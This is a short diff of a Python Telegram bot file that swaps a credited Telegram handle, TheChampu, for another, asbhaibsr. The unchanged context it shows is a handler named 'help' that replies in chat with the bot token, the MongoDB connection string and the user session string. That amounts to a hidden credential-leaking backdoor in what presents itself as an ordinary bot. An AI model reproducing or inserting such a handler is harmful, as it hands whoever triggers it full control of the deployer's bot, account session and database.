@@ -594,12 +594,12 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://envs.sh/kNr.jpg",
-       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/TheChampu)............☆""",
+       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/asbhaibsr)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ᴄʜᴧᴍᴘᴜ •", url=f"https://t.me/TheChampu")
+                         "• ᴀsʙʜᴀɪ •", url=f"https://t.me/asbhaibsr")
                  ]
             ]
          ),
